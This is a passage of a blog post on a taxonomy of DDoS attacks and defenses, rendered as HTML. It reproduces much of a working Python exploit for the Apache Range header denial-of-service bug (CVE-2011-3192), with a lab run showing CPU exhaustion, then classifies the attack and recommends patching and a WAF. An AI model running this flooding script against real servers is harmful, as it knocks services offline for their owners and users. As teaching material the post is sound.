+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">get_method</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="s1">&#39;method&#39;</span><span class="p">,</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="o">.</span><span class="n">get_method</span><span class="p">(</span><span class="bp">self</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_send</span><span class="p">(</span><span class="n">check</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Send the vulnerable request to the target
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;(i) Checking target for vulnerability...&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;bytes=0-,</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;5-</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">item</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">RANGE_NUMBER</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span> <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">USER_AGENT</span><span class="p">,</span> <span class="s1">&#39;Range&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">req</span> <span class="o">=</span> <span class="n">_MethodRequest</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">req</span><span class="o">.</span><span class="n">set_method</span><span class="p">(</span><span class="n">method</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">check</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">response</span> <span class="ow">and</span> <span class="p">(</span><span class="s1">&#39;byteranges&#39;</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span> <span class="ow">or</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">206</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">URLError</span><span class="p">,</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;timed out&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">(i) Server seems to be choked (&#39;</span><span class="si">%s</span><span class="s2">&#39;)&#34;</span> <span class="o">%</span> <span class="n">msg</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s2">&#34;(x) Connection error (&#39;</span><span class="si">%s</span><span class="s2">&#39;)&#34;</span> <span class="o">%</span> <span class="n">msg</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">check</span> <span class="ow">or</span> <span class="s1">&#39;Forbidden&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">_send</span><span class="p">(</span><span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;(x) Target does not seem to be vulnerable&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;(o) Target seems to be vulnerable</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">quit</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="ow">not</span> <span class="n">quit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="s2">&#34;(i) Creating new threads...&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">_send</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">quit</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">raise</span>
+</span></span><span class="line"><span class="cl">                <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="s1">&#39;new thread&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span> <span class="s2">&#34;(i) Maximum number of new threads created (</span><span class="si">%d</span><span class="s2">)&#34;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">threads</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span> <span class="s2">&#34;(x) Exception occured (&#39;</span><span class="si">%s</span><span class="s2">&#39;)&#34;</span> <span class="o">%</span> <span class="n">msg</span>
+</span></span><span class="line"><span class="cl">                <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="ow">not</span> <span class="n">quit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span> <span class="s2">&#34;(o) Waiting for </span><span class="si">%d</span><span class="s2"> seconds to acquire new threads&#34;</span> <span class="o">%</span> <span class="n">SLEEP_TIME</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP_TIME</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">(x) Ctrl-C was pressed&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2"> #v</span><span class="si">%s</span><span class="se">\n</span><span class="s2"> by: </span><span class="si">%s</span><span class="se">\n\n</span><span class="s2">(Note(s): </span><span class="si">%s</span><span class="s2">)</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">VERSION</span><span class="p">,</span> <span class="n">AUTHOR</span><span class="p">,</span> <span class="n">SHORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="o">.</span><span class="n">OptionParser</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="n">VERSION</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&#34;-u&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Target url (e.g. </span><span class="se">\&#34;</span><span class="s2">http://www.target.com/index.php</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&#34;--agent&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;agent&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;User agent (e.g. </span><span class="se">\&#34;</span><span class="s2">Mozilla/5.0 (Linux)</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&#34;--method&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;method&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;HTTP method used (default: GET)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s2">&#34;--proxy&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;proxy&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Proxy (e.g. </span><span class="se">\&#34;</span><span class="s2">http://127.0.0.1:8118</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">options</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">attack</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">url</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">agent</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">method</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>And configuring it with the Burp Suite proxy, the terminal output would look something like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@lab:~# python Apachekiller.py -u 192.168.100.58 --proxy=&#34;http://127.0.0.1:8080&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">KillApachePy (Range Header DoS CVE-2011-3192) #v0.1c
+</span></span></span><span class="line"><span class="cl"><span class="go">by: Miroslav Stampar (@stamparm)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(Note(s): You&#39;ll typically have to wait for 10-20 iterations before first
+</span></span></span><span class="line"><span class="cl"><span class="go">connection timeouts. More complex/bigger the page the better)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(i) Checking target for vulnerability...
+</span></span></span><span class="line"><span class="cl"><span class="go">(o) Target seems to be vulnerable
+</span></span></span><span class="line"><span class="cl"><span class="go">(1) Creating new threads
+</span></span></span></code></pre></div><p>Once executed, let&rsquo;s check our server:<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/ddos_tax_4_hu_1adb33e6fbf4ec56.webp 320w, /post/taxonomy-of-ddos/images/ddos_tax_4_hu_29df5a620d337855.webp 640w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/ddos_tax_4_hu_9ff706d5fd73ecab.jpg 320w, /post/taxonomy-of-ddos/images/ddos_tax_4_hu_f0ec51e53fcc6378.jpg 640w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/ddos_tax_4_hu_f0ec51e53fcc6378.jpg" width="806" height="500" alt="4" title="4" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>As you can see, the CPU usage is maxed out, which demonstrates the vulnerability these Apache versions have. However, let&rsquo;s analyze the requests that were sent.<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/ddos_tax_5_hu_c74c878800d14682.webp 320w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_d097acf157c41564.webp 640w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_94cd434a01955fbf.webp 960w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_c47900f888b68cda.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/ddos_tax_5_hu_e4643d2ce0aefba6.jpg 320w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_50f6a4f59485666d.jpg 640w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_d33df69dcc5b581f.jpg 960w, /post/taxonomy-of-ddos/images/ddos_tax_5_hu_57efc5716fb67065.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/ddos_tax_5_hu_50f6a4f59485666d.jpg" width="1359" height="420" alt="5" title="5" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>As you can see, requests are sent with overlapping ranges, causing our server to process all this data for an extended period (thus consuming resources), which, on a larger scale, can be fatal.<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/6_hu_9b6ad0dd13a63057.webp 320w, /post/taxonomy-of-ddos/images/6_hu_2118da86316dc228.webp 640w, /post/taxonomy-of-ddos/images/6_hu_c448ae5c3965fa3d.webp 960w, /post/taxonomy-of-ddos/images/6_hu_3a585896dd0ceef0.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/6_hu_db8a9372f4a562b8.jpg 320w, /post/taxonomy-of-ddos/images/6_hu_a205d84c8db2d8cc.jpg 640w, /post/taxonomy-of-ddos/images/6_hu_f0f3f7d2b0ecf71a.jpg 960w, /post/taxonomy-of-ddos/images/6_hu_305454290d806f8d.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/6_hu_a205d84c8db2d8cc.jpg" width="1359" height="594" alt="6" title="6" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>Thus, this is an example of a DoS attack that managed to achieve 100% CPU usage. With a simultaneous attack from multiple machines (a DDoS attack), it could potentially crash the server (resulting in a blue screen).</p>
+<p>This would be an example in our taxonomy of an <em>EW-1 (Exploited Weakness to Deny Services: Semantic)</em>, as the attack exploits a bug present in these versions of Apache.</p>
+<p>A solution to this problem would be to update the server and/or apply patches if available, as well as implement a WAF like <em>modSecurity</em>. Therefore, the taxonomy for our DDoS defense mechanism would be <em>AL-1:PG-1:ST-1 (Activity Level: Preventive - Prevention Goal: Attack Prevention - Secured Target: System Security)</em>.</p>
+<p>That’s it—if you have any questions, feel free to reach out.<br>
+-Hackers are People Too 😜</p>
+
+      </article>
+
+      
+
+
+
+
+
+<section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+    <div class="flex flex-row">
+        <span>Share on:</span>
+        <a href="https://x.com/intent/post?text=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89&url=https%3a%2f%2fdrayko.github.io%2fpost%2ftaxonomy-of-ddos%2f&tw_p=tweetbutton"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">Twitter</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+</i>
+        </a>
+        <a href="https://wa.me/?text=%f0%9f%99%8c%20This%20article%20is%20a%20great%20read.%20Check%20it%20out%21%0a%f0%9f%91%89 https%3a%2f%2fdrayko.github.io%2fpost%2ftaxonomy-of-ddos%2f"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">Whatsapp</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-whatsapp" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg></i>
+        </a>
+        <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fdrayko.github.io%2fpost%2ftaxonomy-of-ddos%2f&&t=Taxonomy%20of%20DDoS%20Attacks%20and%20DDoS%20Defense%20Mechanisms" target="_blank"
+            title="" class="flex flex-row mr-2">
+            <span class="hidden">Facebook</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-facebook" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3"></path>
+</svg>
+</i>
+        </a>
+        <a href="https://www.linkedin.com/feed/?shareActive=true&text=https%3a%2f%2fdrayko.github.io%2fpost%2ftaxonomy-of-ddos%2f&title=Taxonomy%20of%20DDoS%20Attacks%20and%20DDoS%20Defense%20Mechanisms"
+            target="_blank" title="" class="flex flex-row mr-2">
+            <span class="hidden">LinkedIn</span>
+            <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path
+     stroke="none"
+     d="M0 0h24v24H0z"
+     fill="none"
+     id="path2" />
+  <path
+     d="m 1.5547568,1.5547568 m 0,2.6113108 A 2.6113108,2.6113108 0 0 1 4.1660676,1.5547568 H 19.833932 a 2.6113108,2.6113108 0 0 1 2.611311,2.6113108 V 19.833932 a 2.6113108,2.6113108 0 0 1 -2.611311,2.611311 H 4.1660676 A 2.6113108,2.6113108 0 0 1 1.5547568,19.833932 Z"
+     id="path4"/>
+  <path
+     d="m 6.7773784,10.694345 v 6.528277"
+     id="path6"/>
+  <path
+     d="m 6.7773784,6.7773784 v 0.013057"
+     id="path8"/>
+  <path
+     d="M 12,17.222622 V 10.694345"
+     id="path10"/>
+  <path
+     d="m 17.222622,17.222622 v -3.916967 a 2.611311,2.611311 0 0 0 -5.222622,0"
+     id="path12"/>
+</svg>
+</i>
+        </a>
+        
+    </div>
+</section>
+
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'Drayko\/Drayko.github.io',
+        repoId: 'MDEwOlJlcG9zaXRvcnkyODM2MTA0MjY=',
+        category: 'Q\u0026A',
+        categoryId: 'DIC_kwDOEOeNOs4Co4JS',
+        mapping: 'pathname',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+    <a href="https://www.linkedin.com/in/drayko" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path
+     stroke="none"
+     d="M0 0h24v24H0z"
+     fill="none"
+     id="path2" />
+  <path
+     d="m 1.5547568,1.5547568 m 0,2.6113108 A 2.6113108,2.6113108 0 0 1 4.1660676,1.5547568 H 19.833932 a 2.6113108,2.6113108 0 0 1 2.611311,2.6113108 V 19.833932 a 2.6113108,2.6113108 0 0 1 -2.611311,2.611311 H 4.1660676 A 2.6113108,2.6113108 0 0 1 1.5547568,19.833932 Z"
+     id="path4"/>
+  <path
+     d="m 6.7773784,10.694345 v 6.528277"
+     id="path6"/>
+  <path
+     d="m 6.7773784,6.7773784 v 0.013057"
+     id="path8"/>
+  <path
+     d="M 12,17.222622 V 10.694345"
+     id="path10"/>
+  <path
+     d="m 17.222622,17.222622 v -3.916967 a 2.611311,2.611311 0 0 0 -5.222622,0"
+     id="path12"/>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://github.com/drayko" target="_blank" title="Github" class="flex flex-row mr-2">
+      <span class="hidden">Github</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://x.com/draykoes" target="_blank" title="Twitter" class="flex flex-row mr-2">
+      <span class="hidden">Twitter</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://t.me/draykoes" target="_blank" title="Telegram" class="flex flex-row mr-2">
+      <span class="hidden">Telegram</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-telegram" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" />
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+  
+    <a href="https://www.facebook.com/draykoes" target="_blank" title="Facebook" class="flex flex-row mr-2">
+      <span class="hidden">Facebook</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-facebook" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.instagram.com/draykoes" target="_blank" title="Instagram" class="flex flex-row mr-2">
+      <span class="hidden">Instagram</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-instagram" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 4a4 4 0 0 1 4 -4h8a4 4 0 0 1 4 4v8a4 4 0 0 1 -4 4h-8a4 4 0 0 1 -4 -4z"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M16.5 7.5l0 .01"></path>
+</svg>
+ </i>
+    </a>
+  
+  
